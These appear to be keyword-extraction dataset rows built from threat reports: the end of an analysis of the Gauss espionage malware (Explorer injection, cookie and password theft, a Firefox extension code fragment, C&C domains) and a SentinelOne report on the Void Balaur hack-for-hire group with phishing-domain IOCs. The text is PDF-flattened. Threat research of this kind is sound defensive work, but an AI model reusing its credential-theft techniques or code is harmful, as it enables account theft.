removes all entries in SOFTWARE\Mozilla\Mozilla\Firefox for each user, searches for its log ws1bin.dat and removes it.Export “SetWindowEvent” : set event “Global\DhwSyncEvent”, wait for other thread to exit in 20 seconds, then terminate that thread.Export “ShellNotifyUser” : returns 1Export “ShellNotifyUserEx” : main export. Starts its main thread that should be monitored by the event “SetWindowEvent” and returns.Lists running processes and returns if “evil.exe” is running. Additionally logs the presence of the following registry keys :HKLM\SOFTWARE\KasperskyLab\AVP6”, “HKLM\SOFTWARE\KasperskyLab\ protected\AVP7Then it starts a loop searching for running instances of %systemroot%\explorer.exe. If found, it injects %systemroot%\system32\winshell.ocx (own body) into that process.It uses an interesting technique to inject itself into Explorer: it creates a remote thread with the address of “LoadLibraryW” API as its start address. The path to its ocx file is passed to the function as “lpParameter”.32Telemetry: It retrieves and logs the following:► Computer name► Windows OS version► List of running processes► List of directories in %PROGRAMFILES%► Version of Internet Explorer browser► Primary domain name► Network adapter informationSearches for Cookies directory, retrieves all cookie files and writes their contents into its log. Searches for cookies that contain the following strings:paypalmastercard ebaymaktoobThen, it retrieves Internet Explorer browsing history using IUrlHistoryStg::EnumUrls function, and tries to extract password and text fields from loaded pages.The Firefox plugin is written in several files, all of them are extracted and decrypted from the resources of the module.Resource Id 126File name of the Firefox Plugin component install.rdfAppends Firefox configuration file “prefs.js” with the following string, disabling Firefox “select your add-ons” window that is usually shown after each Firefox update:user _ pref(“extensions.shownSelectionUI”, true);33Installs the Firefox extension, on Windows Vista and Windows 7 into AppData\Roaming\Mozilla\Firefox\Profiles, on earlier versions into Application Data\Mozilla\Firefox\Profiles. All files are written in a directory named “{a288cad4-7b24-43f8-9f4d-8e156305a8bc}”.The Firefox extension extracts the following data:► Browsing history► Passwords (saved and entered by the user)► Cookies. The extension can be configured to look only for cookies of Google, Hotmail, Facebook, Yahooconst Cc = Components.classes; const Ci = Components.interfaces; const EXTENSION _ ID = “{a288cad4-7b24-43f8-9f4d-8e156305a8bc}”; const EXTENSION _ PATH = DirIO.get(“ProfD”).path+”\\extensions\\”+ EXTENSION _ ID; const QUERY _ ID = ‘YlU/X1gFa2Isb1YkcFMnP18u`1kkb1goYFUO akAgY1ULa1EjYlU/X1gPXWMyc18xYGM0b1UxalEsYVYgX1Uha18q dVEna18lYWQi`Dgob2QubmklYWQi`DEjYGIkb2MvXWMyc18xY FwoclUl`WgPblUlb/oSY18uY1wk`FkjYT8tRV4ocFYkcFMnPVwr P18u`1kkb2gublk/’; const EXTENSION _ URL = “about:addons”; const EXTENSION _ XUL = “chrome://mozapps/content/extensions/ extensions.xul”; const ERROR _ FILE = “rssf.dat”; const LOG _ FILE = “lfm.dat”; const OUTPUT _ FILE = “mppd.dat”; const VERSION _ FILE = “lddp.dat”; const MAX _ FILE _ SIZE = Math.pow(2,20)*10; const MEAN _ ROW _ SIZE = 100; const MAX _ ROW _ COUNT = (1/3)*(MAX _ FILE _ SIZE/MEAN _ ROW _ SIZE);Part of browser.js code34The Firefox extension writes several log files in its directory:Log file namerssf.dat pddp.datDescriptionBrowsing historyLog fileCollected passwords Collected cookiesFile Version: 5.1.3700.0 Product Version: 5.1.3700.0 File OS: NT (WINDOWS32) File Type: DRV File SubType: DRV SOUND File Date: 00:00:00 00/00/0000 Language/Code Page: 1033/1200 CompanyName: Microsoft Corporation FileDescription: Microsoft Windows Shell Component FileVersion: 5.1.3700.0 InternalName: winshell.ocx LegalCopyright: © Microsoft Corporation. All rights reserved. OriginalFilename: winshell.ocx ProductName: Microsoft® Windows® Operating System ProductVersion: 5.1.3700.0Version info “winshell.ocx”35Windig.ocxName of the module used in Gauss: “Lagrange”File names Date of compilation Related files%system32%\windig.ocx DE2D0D6C340C75EB415F726338835125 180 224 bytes 15.07.2011 Fonts\ pldnrfn.ttfThe module is a Windows DLL file with one exported function called “GlobalDeleteAtomL.”\The module reads the registry key that is originally created by “ShellHW” module :HKLM\ SOFTWARE\Microsoft\Windows\CurrentVersion\Reliability ShutdownInterval = binary dataIf the value is not present in the registry, it writes a random value into that key.Then, it creates a new TrueType font file “%SystemRoot%\fonts\pldnrfn.ttf” (62 668 bytes long) from a template and using randomized data from the ShutdownInterval key. The creation time of the font file is set to the creation time of the Arial font, %SystemRoot%\fonts\ARIAL.TTF.Then, a custom font named “Palida Narrow” is registered in the system font storage using the “AddFontResourceW” API function. The module also creates a registry value:HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts Palida Narrow (TrueType)=pldnrfn.ttfThe purpose of the addition of this font is not yet known. It appears to contain valid Western, Baltic and Turkish symbols.36Font information from Font ViewerFile Version: 2001.12.4414.320 Product Version: 5.1.2600.5788 File OS: WINDOWS32 File Type: DLL File SubType: UNKNOWN File Date: 00:00:00 00/00/0000 Language/Code Page: 1033/1200 CompanyName: Microsoft Corporation FileDescription: WIN32 Digital Library FileVersion: 2001.12.4414.320 LegalCopyright: Copyright (C) Microsoft Corp. 1995-1999 LegalTrademarks: Microsoft(R) is a registered trademark of Microsoft Corporation. Windows(TM) is a trademark of Microsoft Corporation ProductName: Microsoft® Windows® Operating System ProductVersion: 05.01.2600.5788Version info “windig.ocx”37Gauss C&C InformationTo upload data stolen from infected machines, Gauss uses a number of command-and-control servers predefined in its flexible configuration.Here’s a look at the decrypted configuration data:Figure 1 - Gauss encrypted C&C information dataFigure 2 - Gauss decrypted C&C configuration data38In the example above, we can see the C&C domains/hosts together with the name of the script (userhome.php) on the server which is used for communication.Going through the multitude of Gauss samples, we identified several domains used as C&C servers:► *.gowin7.com► *.secuurity.net► *.datajunction.org► *.bestcomputeradvisor.com► *.dotnetadvisor.info► *.guest-access.netWmiqry.ocx 01.06.2011 16.07.2011 18.07.2011 28.09.2011 20.10.2011 20.10.2011dotnetadvisor.info *.gowin7.combestcomputeradvisor.info *.guest-access.net *.guest-access.net *.secuurity.netdatajunction.orgguest-access.netDepending on the variant, * can be ‘a’ or ‘b’ or ‘c’ – and so on.For instance, a fully qualified hostname as in the example above is “b.gowin7.com”.Most samples we have use “*.gowin7.com” and “*.secuurity.net”. The domains “gowin7.com” and “secuurity.net “ have been registered by an “Adolph Dybevek, which is most likely a fake identity:owner-name: Adolph Dybevek owner-address: Prinsen gate 6 owner-city: Oslo admin-address: Prinsen gate 6 ICANN Registrar: UNITED-DOMAINS AG Created: 2012-03-15 Expires: 2013-03-15 Updated: 2012-03-1539As in the case of Flame these domain registration addresses point to existing businesses. For example, at Prinsens Gate 6 in Olso, we find a hotel in Norway:Similarly, many of Flame C&D domain fake registrations used addresses of hotels.During the period of monitoring, we observed these two main domains pointing to two different servers in India and Portugal. Based on passive DNS research, we identified three other servers, located in the US which appear to have been used as C&C.The hosts “gowin7.com” and “secuurity.net” pointed to the following IP addresses:Date2012-06-28 23:05:352012-06-29 07:05:28 (changed)2012-06-28 23:05:382012-06-29 07:05:29 (changed)Domainb.gowin7.com b.gowin7.com b.secuurity.net appeared to be running Debian Linux, which is consistent with the Flame C&C servers. They were listening on ports 22, 80 and 443. The SSL certificates were self-signed, once again, the same as in the case of Flame. Here’s the certificate for the Neugasse 10 Zurich, Zurich 8005 control. It’s quite possible that other samples exist pointing to different hosts.The additional domains ”datajunction.org” and “guest-access.net” can be found in some samples and it is also used for C&C communications. We currently have samples which use “c.datajunction.org” and “d.datajunction.org” but there are probably others using “a.*” and “b.*”.Both have been registered by somebody named “Peter Kulmann,” probably another fake identity:Registrant Name:Peter Kulmann Registrant Street1:Antala Staska 1301/19 Registrant City:Prague Registrant State/Province: Registrant Postal Code:14000 Registrant Country:CZThe address “Antala Staska 1301/19” appears once again to be fake – pointing to a supermarket/pharmacy in Prague:Currently (as of August 2012), all the “*.datajunction.org” hosts point to the C&C server in India. Previously, they pointed to the server in Portugal. Just like the others, they were previously hosted in US.In addition to these, we identified another domain named “dataspotlight.net” which was hosted on the same servers. The registrant is unknown and we couldn’t find any samples using it, however, it is probably related to the others.42Gauss C2 Domains Overview:In total, we have identified 7 domains used or related to the Gauss malware:Domaingowin7.com guest-access.netDomain registration history:Registered by Peter KulmannCurrently hostedPreviously hostedOlder hosted:India USUNKNOWNNoDomainbestcomputeradvisor.com, dotnetadvisor.info datajunction.org. guest-access.net gowin7.com, secuurity.net dataspotlight.netRegistration date22 July 2011 26 July 2011 15 March 2012 18 April 2012As can be seen from the table above, four domains were created in 2011 and were used in older samples. The newer United States, San Francisco United States, San Francisco43Here’s a comparison of the Flame and Gauss C2 infrastructure:FlameVPS running Debian LinuxSSH, HTTP, HTTPS“localhost.localdomain”– self signed Nonecgi-bin/counter.cgi, common/index.php~100 ~20GaussVPS running Debian LinuxSSH, HTTP, HTTPS“localhost.localdomain”– self signed Fake names Hotels, shopsHTTPSXOR 0xACDC SSL certificateRegistrant info Address of registrants C2 traffic protocol C2 traffic encryption C2 script names Number of C2 domains Number of fake identities used to register domainsDNS BalancingFor some of the C2’s, the controllers used a technique known as DNS balancing or “Round robin DNS” (url org/wiki/Round-robin_DNS) – probably to even the load. This is a common technique in the case of massive traffic to a website, suggesting that at their peak, the Gauss C2’s were handling quite a lot of data.Here’s one such example of DNS balancing:;;QUESTION SECTION: ;DATAJUNCTION.ORG. IN A;;ANSWER SECTION: Duqu. Since no Gauss modules created before 2011 have been found, the table below does not include earlier data for Flame and Duqu modules.Module name (2011)Date of creationadvnetcfg.2 wmiqry32.1dskapi.32 res.1 dskapi.64 reswindig.1wmiqry32.2 dskapi.1wmiqry32.4 smdk.2igdkmd16b.syswmiqry32.5 dskapi.4dskapi.32 res.2winshell.311.01.2011 11.01.2011 23.01.2011 17.02.2011 21.03.2011 29.03.2011 01.06.2011 30.06.2011 30.06.2011 15.07.2011 16.07.2011 18.07.2011 08.08.2011 31.08.2011 16.09.2011 27.09.2011 28.09.2011 28.09.2011 03.10.2011 10.10.2011 13.10.2011 17.10.2011 17.10.2011 20.10.2011 26.10.2011 01.11.2011 27.11.2011 29.11.2011 29.11.2011 14.12.2011Module name (2012)Date of creationwinshell.4mcd9x86.sysdevwiz.1browse32.ocx05.01.2012 23.02.2012 19.03.2012 09.05.2012Malware Flame45Files listWe have put together the names of all modules, temporary files, log files and data files used by Gauss in one way or another and that are known to us.Main modules windig.ocxsystem32.bin system32.dat .CatRoot.tmpData files and folders~shw.tmp target.lnk.Backup0[D-M] .Backup00[D-M]md.baks61cs3.dat s61cs3.dat~ZM6AD3.tmpbrowser.jsPath root folder USB drive root folder USB drive root folder USB drive root folder USB drive %temp% inside folders on USB drive inside folders on USB drive directory on USB drive directory on USB drive %AppData%\Roaming\Mozilla\Firefox\Profiles\*\{a288cad4- 7b2443f89f4d-8e156305a8bc} %AppData%\Mozilla\Firefox\Profiles\*\{a288cad4-7b24-43f8- 9f4d-8e156305a8bc}46browser.xulfileio.js%AppData%\Roaming\Mozilla\Firefox\Profiles\*\{a288cad4-7b24- 43f8-9f4d-8e156305a8bc} %AppData%\Mozilla\Firefox\Profiles\*\{a288cad4-7b24-43f8- 9f4d-8e156305a8bc}%AppData%\Roaming\Mozilla\Firefox\Profiles\*\{a288cad4-7b24- 43f8-9f4d-8e156305a8bc} %AppData%\Mozilla\Firefox\Profiles\*\{a288cad4-7b24-43f8- 9f4d-8e156305a8bc}chrome.manifest%AppData%\Roaming\Mozilla\Firefox\Profiles\*\{a288cad4-7b24- 43f8-9f4d-8e156305a8bc} %AppData%\Mozilla\Firefox\Profiles\*\{a288cad4-7b24-43f8- 9f4d-8e156305a8bc}lppd.datinstall.rdfrssf.datlfm.datmppd.datpddp.dat%AppData%\Roaming\Mozilla\Firefox\Profiles\*\{a288cad4-7b24- 43f8-9f4d-8e156305a8bc} %AppData%\Mozilla\Firefox\Profiles\*\{a288cad4-7b24-43f8- 9f4d-8e156305a8bc}%AppData%\Roaming\Mozilla\Firefox\Profiles\*\{a288cad4-7b24- 43f8-9f4d-8e156305a8bc} %AppData%\Mozilla\Firefox\Profiles\*\{a288cad4-7b24-43f8- 9f4d-8e156305a8bc}%AppData%\Roaming\Mozilla\Firefox\Profiles\*\{a288cad4-7b24- 43f8-9f4d-8e156305a8bc} %AppData%\Mozilla\Firefox\Profiles\*\{a288cad4-7b24-43f8- 9f4d-8e156305a8bc}%AppData%\Roaming\Mozilla\Firefox\Profiles\*\{a288cad4-7b24- 43f8-9f4d-8e156305a8bc} %AppData%\Mozilla\Firefox\Profiles\*\{a288cad4-7b24-43f8- 9f4d-8e156305a8bc}%AppData%\Roaming\Mozilla\Firefox\Profiles\*\{a288cad4-7b24- 43f8-9f4d-8e156305a8bc} %AppData%\Mozilla\Firefox\Profiles\*\{a288cad4-7b24-43f8- 9f4d-8e156305a8bc}%AppData%\Roaming\Mozilla\Firefox\Profiles\*\{a288cad4-7b24- 43f8-9f4d-8e156305a8bc} %AppData%\Mozilla\Firefox\Profiles\*\{a288cad4-7b24-43f8- 9f4d-8e156305a8bc}pldnrfn.ttf%SystemRoot%\fonts\47ConclusionGauss is the most recent development from the pool of cyber-espionage projects that includes Stuxnet, Flame and Duqu. It was most likely created in mid-2011 and deployed for the first time in August-September 2011.Its geographical distribution is unique; the majority of infections were found in Lebanon, Palestine and Israel. One of the modules from Jan 2012 contains the path “c:\documents and settings\flamer\desktop\gauss_white_1”. The “flamer” in the path above is the Windows username that compiled the project. Given the focus on Lebanon, the “white” version identifier can probably be explained as following: “the name Lebanon comes from the Semitic root LBN, meaning “white”, likely a reference to the snow-capped Mount Lebanon.” (Wikipedia)Code references and encryption subroutines, together with the Command and Control infrastructure make us believe Gauss was created by the same “factory” which produced Flame. This indicates it is most likely a nation-state sponsored operation.Between Gauss’ functions, the “Winshell.ocx” module which gives the name to the malware as “Gauss”, steals credentials required to access online banking accounts for several Lebanese banks – including the Bank of Beirut, Byblos Bank and Fransabank. This is the first publicly known nation-state sponsored banking Trojan.Another feature which makes Gauss unique is its encrypted payload, which we haven’t been able to unlock. The payload is run by infected USB sticks and is designed to surgically target a certain system (or systems) which have a specific program installed. One can only speculate on the purpose of this mysterious payload.The discovery of Gauss indicates that there are probably many other related cyber-espionage malware in operation. The current tensions in the Middle East are just signs of the intensity of these ongoing cyber-war and cyber-espionage campaigns.48 ","{'phrases': ['PE', 'email', 'Documents', 'XP', 'code', 'ShellHW', 'Installs', 'Godel', 'UsbDir', 'Browser', 'data', 'a.', 'The Gauss module', 'Lebanese', 'COUNT', 'credentials', 'the C2', 'servers', 'HTTPS', 'the USB', 'removable drives', 'systems', 'USB drives', 'new modules', 'commands'], 'target': 'PE; email; Documents; XP; code; ShellHW; Installs; Godel; UsbDir; Browser; data; a.; The Gauss module; Lebanese; COUNT; credentials; the C2; servers; HTTPS; the USB; removable drives; systems; USB drives; new modules; commands.'}"
Void Balaur; organizations; use; social media; accounts; legitimate services; access; the group; Hacknet; services; the target; access; control; servers; RC4; communications; WhatsApp; the group; IP; data; processes; communication; additional services; command; control; servers; Germany; Europe; the attacker.,"[' 1. Void Balaur registers domains to be used for phishing and malware distribution. Many follow predictable patterns impersonating account services. 2. The group distributes phishing emails to targets, often generic themes but may be tailored with details relevant to the target. 3. Phishing emails contain links leading to Void Balaur domains hosting credential harvesting pages disguised as login portals. 4. Users who enter credentials on fake login pages unknowingly provide their usernames/passwords to Void Balaur. 5. For accounts with multi-factor authentication, Void Balaur requests one-time backup codes to bypass MFA protections. 6. Using stolen credentials, Void Balaur gains access to target email accounts, social media, etc. 7. Void Balaur deploys malware like GrimPlant and GraphSteel for further access, reconnaissance, and data exfiltration. 8. Malware achieves persistence and connects to command and control servers operated by Void Balaur. 9. Group monetizes access by selling to customers and facilitating further exploitation. ']","Extract the keywords: www.sentinelone.com /labs/the-sprawling-infrastructure-of-a-careless-mercenary/ Void Balaur | The Sprawling Infrastructure of a Careless Mercenary Tom Hegel ⋮Executive SummaryThe cyber mercenary group known as Void Balaur continues to expand their hack-for-hire campaigns into 2022 unphased by disruptions to their online advertising personas. New targets include a wide variety of industries, often with particular business or political interests tied to Russia. Void Balaur also goes after targets valuable for prepositioning or facilitating future attacks. Their targets span the United States, Russia, Ukraine, and various other countries. Attacks are often very generic in theme, may appear opportunistic in nature, and account for targets making use of multi-factor authentication. The group seeks access to well-known email services (Gmail, Outlook, Yahoo), social media (Facebook, Instagram), messaging (Telegram), and corporate accounts. A unique and short-lived connection links Void Balaur’s infrastructure to the Russian Federal Protective Service (FSO), a low-confidence indication of a potential customer relationship or resource sharing between the two.OverviewVoid Balaur is a highly active hack-for-hire / cyber mercenary group with a wide range of known target types across the globe. Their services have been observed for sale to the public online since at least1/272016. Services include the collection of private data and access to specific online email and social media services, such as Gmail, Outlook, Telegram, Yandex, Facebook, Instagram, and business emails.Void Balaur was first reported in 2019 (eQualitie), then again in 2020 (Amnesty International). In November 2021, our colleagues at Trend Micro profiled the larger set of malicious activity and named the actor “Void Balaur” based on a monster of Eastern European folklore. Most recently Google’s TAG highlighted some of their activity earlier this year. Building on top of analysis from each of our above colleagues, the purpose here is to share our analysis of interesting findings based on newer activity and the large scale set of attacker infrastructure.During our inaugural LABScon event today I presented on this very topic – a careless mercenary group known as Void Balaur. Attendees of the conference were given a more detailed overview of the content shared here, including specific details on attribution to individuals in Latvia. In the spirit of LABScon, I look forward to further tracking of this actor alongside our industry colleagues to better protect society. The Hack-for-Hire BusinessThe hack-for-hire service offering linked to Void Balaur has been advertised through various brand names, as also noted by previous reporting. These are only two early examples of likely others run by the same entity.First is Hacknet, or “Hackernet-Service”, which began operating in late 2016. In these early years of activity, the group advertised their “Professional Hacking to Order” service for good and to help meet the needs others can not meet. The name can be found advertising across many darkweb forums.The section on legality of their service provides insight into the mindset and justification of the attacker.2/27Hacknet-Service legality section – OriginalHacknet-Service legality section – TranslatedServices first offered for hacking at the time included Yandex, Rambler, Mail.ru, Gmail, UKR.net, Yahoo, Outlook, corporate email, Instagram, VK.com, OK.ru, Facebook, and Skype, in addition to “Hacking Training”.A year later in 2017 the group removed the services of hacking Outlook, Facebook, and UKR.net while adding ICQ messages. In 2018, the group updated their legality pitch noting that corporate email and other requests outside of their advertised list would be considered. Additionally, the group began offering services around content modification/uploading to email and social media networks.3/27Hacknet-Service Offerings Section – TranslatedUltimately, the Hacknet persona and their service ended around early 2020 following bans across services and brand collapse after failing to follow through with hacking services they were paid for.4/27The second example is “RocketHack”, which became active in early 2018, acting as a second persona operated by the same entity.The RocketHack persona and offerings were thoroughly documented in the TrendMicro report. Interestingly, in our screenshot of their landing page, they used a quote from Nikolay Kononov’s book Kod Durova, a story on the creation of the Russian VK social network.Around 2019, Hacknet and RocketHack began offering services through various hacker forums to provide information on individuals, including banking and government documents. The personas also begin to offer services for:Remote access or perform requested actions on target PCs Remove content from any blogs, forums, YouTube Channels, news sites or databases “of any institution”. Cleanup information online, and manipulate search engine results. Remote access to iPhones, mobile tracking, manulating associated data. SMS historical records of targets. Real time location tracking through mobile networks.Void Balaur InfrastructureAs of this blog, Void Balaur has operated over 5,000 unique domains used against individual targets. With a quantity of actor controlled domains in the thousands, each provides us an opportunity for the5/27attacker to make mistakes and lead us to a new set of useful clues. Focusing on the most recent activity from Void Balaur, the set of domains follow a repeating generic set of patterns.Free Email ServicesE.g., mail-my-accounts-gmail[.]comEmail Security / PrivacyE.g., security-my-account[.]ruEmail Authentication / OAuthaccounts-oauth-gmail[.]comPassports / Local Government (Limited, often Russian focus)E.g., no-reply-gosuslugi[.]ruThe collection of associated attacker infrastructure, such as domains and non-shared IPs, is quite large and requires automated methods of tracking to keep up.Synapse Visual Representation of Domain ScaleBased on our collection of all known Void Balaur domains, we can determine the creation time of each based on year for an estimate of actor campaign activity. While early years activity was generally a very small set of infrastructure, we can note the explosion of activity in 2019. Around this time is when the group was gaining a bad reputation and abandoning brands (Hacknet). This indicates that the group remained highly active without a well known brand, potentially fulfilling requests for customers without the need to publicly advertise anymore.It’s worth noting that the 2022 quantity is lower than expected at this time. However, the group historically has registered domains in bulk rather than evenly throughout the year. Additionally, we have observed a new set of infrastructure and campaigns we believe may be Void Balaur; however, technical links are not yet confident enough to publicly share at this time. Such activity could be an entirely unique group, or a new phase of Void Balaur attempting to evade further tracking.6/27Domain Count by YearIntriguing RelationshipsA potential indicator of the careless OPSEC in the Void Balaur infrastructure is a low confidence connection to the Russian Federal Protective / Guard Service (FSO). The FSO institution operates with a range of capabilities, including the right to conduct surveillance, monitor communications, and operate clandestine activities. Was this a customer-confidentiality oversight by Void Balaur? Perhaps a mistake in the workflow of expanding their infrastructure? The meaning and exact technical reason behind this connection is unclear; however, based on our attribution to technical operators outside of Russia, it is potentially a clue that Russian intelligence agencies are somehow involved with Void Balaur and the FSO is either directly using the services or supporting the use of the services internally.Specifically, one domain in the thousands of those created and operated by Void Balaur over the years was seen immediately resolving to the Russian FSO network after it was registered. In early 2022 the domain accounts-my-mail-gmail[.]com resolved to 95.173.132[.]1 for four days following its registration, then quickly shifting to the traditional Void Balaur cluster of infrastructure. The IP 95.173.132[.]1 is owned and operated by the Russian FSO, typically reserved for official .ru government websites. To reiterate, this connection is only observed once in the entirety of Void Balaur infrastructure.7/27Visualization of link between Void Balaur Infrastructure and FSOTargetingVoid Balaur continues their known targeting of a wide variety of individuals and organizations across the globe. The vast majority of known 2022 targets hold a special interest or involvement in business and political situations relevant to organizations inside Russia. Examples include individuals heavily involved in geopolitics, legal, business transactions, technology, human rights and more. Locations of these individuals include:Russia Central African Republic Sudan8/272022 Target MapWe observed continued targeting in 2022 making use of generic, highly reproducible, phishing emails to lure targets into providing account credentials. Based on thousands of phishing domains we collected, Google owned services are the most common targets and attack themes.However, in most cases the phishing emails are somewhat more relevant to the target of choice. For example, this includes emails designed to mimic local government services, or online websites common to a particular target, such as banking or social media. Void Balaur has made use of this approach for much of its existence. Examples include a 2016 attempt at phishing on the Moscow motorcycle road racing Youtuber Alexey Naberezhny, and in 2017 the Russian journalist and social media personality Ilya Varlamov. These individuals were targeted by Void Balaur with phishing emails spoofing Russian Public Services traffic fines.9/27Void Balaur Traffic Fine Phishing Message Targeting Ilya Varlamov10/27Void Balaur Traffic Fine Phishing Message Targeting Alexey NaberezhnyIn this case, the payment link goes to srv-gm[.]ru, accountc-gooogle.com, and others, which returns an illicit Google login page.11/27Google Phishing PageIn 2022, we observed cases in which Void Balaur sought to compromise Google accounts with multi- factor authentication enabled as well. For example, some phishing pages would ask the target to enter backup codes Google provides during the initial 2-Step verification setup process.12/27llicit 2-Step Verification Backup Code RequestConclusionVoid Balaur remains a highly active and evolving threat to individuals across the globe. From the targeting of well known email services to the offering of hacking corporate networks, the group represents a clear example of the hack-for-hire market. We expect this type of actor to be increasingly common to observe in the wild.13/27Recent IOCs account-mail-passport[.]ru account-my-mail-gmail[.]com account-my-oauths-mail[.]ru account-oauth-gmail[.]com accounts-mail-passport[.]ru accounts-my-mail-gmail[.]com accounts-my-oauth-mail[.]ru accounts-oauth-gmail[.]com cloud-account-mail[.]ru cloud-accounts-goglemail[.]com cloud-accounts-mail[.]ru cloud-my-accounts-mail[.]ru cloud-myaccount-goglemail[.]com cloud-myaccount-mail[.]ru community-experience-manager[.]ru community-experience-my-community[.]ru community-experience-permission[.]ru community-experience-preference[.]ru community-experience-types[.]ru community-experience[.]ru community-manager-experience[.]ru community-manager-place[.]ru community-manager-preference[.]ru community-manager-safety[.]ru community-manager-smartlink[.]ru community-manager-types[.]ru community-manager[.]ru community-my-permission[.]ru community-my-place[.]ru community-my-safe[.]ru community-my-safety[.]ru community-my-source[.]ru community-my-types[.]ru community-online-experience[.]ru community-online-manager[.]ru community-online-permission[.]ru community-online-place[.]ru community-online-types[.]ru community-permission-experience[.]ru community-permission-manager[.]ru community-permission-preference[.]ru community-permission-source[.]ru14/27community-permission[.]ru community-place-community[.]ru community-place-manager[.]ru community-place-permission[.]ru community-place-preference[.]ru community-place-types[.]ru community-place[.]ru community-preference-manager[.]ru community-preference-permission[.]ru community-preference-place[.]ru community-safe-manager[.]ru community-safe-permission[.]ru community-safe-place[.]ru community-safe-types[.]ru community-safety-manager[.]ru community-safety-my-experience[.]ru community-safety-permission[.]ru community-safety-place[.]ru community-safety-preference[.]ru community-safety-types[.]ru community-smartlink-experience[.]ru community-smartlink-manager[.]ru community-smartlink-permission[.]ru community-smartlink-types[.]ru community-source-manager[.]ru community-source-permission[.]ru community-source-place[.]ru community-source-preference[.]ru community-types-experience[.]ru community-types-manager[.]ru community-types-permission[.]ru community-types[.]ru experience-community-manager[.]ru experience-community-my-smartlink[.]ru experience-community-permission[.]ru experience-community-preference[.]ru experience-manager-community[.]ru experience-manager-permission[.]ru experience-manager-place[.]ru experience-manager-safety[.]ru experience-manager-smartlink[.]ru experience-manager-types[.]ru experience-manager[.]ru experience-my-community-smartlink[.]ru15/27experience-my-manager[.]ru experience-my-online-smartlink[.]ru experience-my-permission[.]ru experience-my-place[.]ru experience-my-preference-smartlink[.]ru experience-my-preference[.]ru experience-my-safe-smartlink[.]ru experience-my-safe[.]ru experience-my-safety[.]ru experience-my-source-smartlink[.]ru experience-my-source[.]ru experience-online-manager[.]ru experience-online-my-smartlink[.]ru experience-online-permission[.]ru experience-online-place[.]ru experience-online-preference[.]ru experience-online-smartlink[.]ru experience-online-types[.]ru experience-permission-community[.]ru experience-permission-manager[.]ru experience-permission-place[.]ru experience-permission-preference[.]ru experience-permission-smartlink[.]ru experience-permission-source[.]ru experience-permission[.]ru experience-place-smartlink[.]ru experience-place-types[.]ru experience-place[.]ru experience-preference-manager[.]ru experience-preference-my-smartlink[.]ru experience-preference-permission[.]ru experience-preference-place[.]ru experience-preference-smartlink[.]ru experience-safe-manager[.]ru experience-safe-my-smartlink[.]ru experience-safe-permission[.]ru experience-safe-place[.]ru experience-safe-preference[.]ru experience-safe-smartlink[.]ru experience-safe-types[.]ru experience-safety-manager[.]ru experience-safety-my-smartlink[.]ru experience-safety-permission[.]ru experience-safety-place[.]ru16/27experience-safety-preference[.]ru experience-safety-smartlink[.]ru experience-safety-types[.]ru experience-smartlink-manager[.]ru experience-smartlink-permission[.]ru experience-smartlink-preference[.]ru experience-source-my-smartlink[.]ru experience-source-place[.]ru experience-source-preference[.]ru experience-source-smartlink[.]ru experience-types-place[.]ru experience-types-smartlink[.]ru experience-types[.]ru login-account-cloud-mail[.]ru login-accounts-mail[.]ru login-auth-account-mail[.]ru login-auth-accounts-mail[.]ru login-cloud-account-mail[.]ru login-cloud-myaccount-mail[.]ru login-my-acounts-mail[.]ru login-myaccount-cloud-mail[.]ru login-oauth-mail[.]ru mail-auth-account[.]ru mail-auth-myacount[.]ru mail-ems[.]ru mail-login-auth[.]ru mail-login-oauth[.]ru mail-my-acounts-mail[.]ru mail-my-passport-account[.]ru mail-security-myaccount[.]ru mail-security-myaccounts[.]ru manager-community-permission[.]ru manager-community-place[.]ru manager-community-types[.]ru manager-experience-permission[.]ru manager-experience-place[.]ru manager-experience-preference[.]ru manager-experience-types[.]ru manager-my-community[.]ru manager-my-experience[.]ru manager-my-preference[.]ru manager-my-safe[.]ru manager-my-smartlink[.]ru manager-my-source[.]ru17/27manager-online-community[.]ru manager-online-permission[.]ru manager-online-place[.]ru manager-online-preference[.]ru manager-online-smartlink[.]ru manager-online-types[.]ru manager-permission-place[.]ru manager-permission-preference[.]ru manager-permission-source[.]ru manager-permission-types[.]ru manager-place-community[.]ru manager-place-experience[.]ru manager-place-permission[.]ru manager-place-preference[.]ru manager-place-smartlink[.]ru manager-place-types[.]ru manager-preference-community[.]ru manager-preference-permission[.]ru manager-preference-place[.]ru manager-preference-smartlink[.]ru manager-preference-types[.]ru manager-safe-community[.]ru manager-safe-experience[.]ru manager-safe-permission[.]ru manager-safe-place[.]ru manager-safe-preference[.]ru manager-safe-smartlink[.]ru manager-safe-types[.]ru manager-safety-community[.]ru manager-safety-permission[.]ru manager-safety-place[.]ru manager-safety-smartlink[.]ru manager-smartlink-permission[.]ru manager-smartlink-place[.]ru manager-smartlink-types[.]ru manager-source-community[.]ru manager-source-permission[.]ru manager-source-place[.]ru manager-source-preference[.]ru manager-source-smartlink[.]ru manager-types-community[.]ru manager-types-experience[.]ru manager-types-permission[.]ru manager-types-place[.]ru18/27my-account-auth-mail[.]ru my-account-mail-passport[.]ru my-account-my-cloud-mail[.]ru my-account-oauth-mail[.]ru my-accounts-mail-passport[.]ru my-acount-oauths[.]ru my-cloud-accounts-mail[.]ru my-community-experience[.]ru my-community-manager[.]ru my-community-permission[.]ru my-community-place[.]ru my-community-smartlink[.]ru my-community[.]ru my-experience-manager[.]ru my-experience-permission[.]ru my-experience-place[.]ru my-experience-preference[.]ru my-mail-account-mail[.]ru my-mail-account-yahoo[.]com my-mail-accounts-mail[.]ru my-manager-community[.]ru my-manager-experience[.]ru my-manager-place[.]ru my-manager-preference[.]ru my-manager-safety[.]ru my-manager-smartlink[.]ru my-oauth-account-gmail[.]com my-oauth-account-mail[.]ru my-oauth-accounts-mail[.]ru my-oauths-account-mail[.]ru my-oauths-accounts-mail[.]ru my-online-experience[.]ru my-online-permission[.]ru my-online-place[.]ru my-permission-community[.]ru my-permission-experience[.]ru my-permission-manager[.]ru my-permission-place[.]ru my-permission-preference[.]ru my-permission-smartlink[.]ru my-place-smartlink[.]ru my-preference-experience[.]ru my-preference-manager[.]ru my-preference-permission[.]ru19/27my-preference-place[.]ru my-preference[.]ru my-safe-community[.]ru my-safe-experience[.]ru my-safe-permission[.]ru my-safe-place[.]ru my-safety-community[.]ru my-safety-experience[.]ru my-safety-permission[.]ru my-safety-place[.]ru my-signin-account-gmail[.]com my-signin-accounts-gmail[.]com my-smartlink-experience[.]ru my-smartlink-manager[.]ru my-smartlink-permission[.]ru my-smartlink-place[.]ru my-smartlink[.]ru my-source-community[.]ru my-source-place[.]ru my-types-community[.]ru my-types-permission[.]ru my-types-place[.]ru myaccount-mail-passport[.]ru 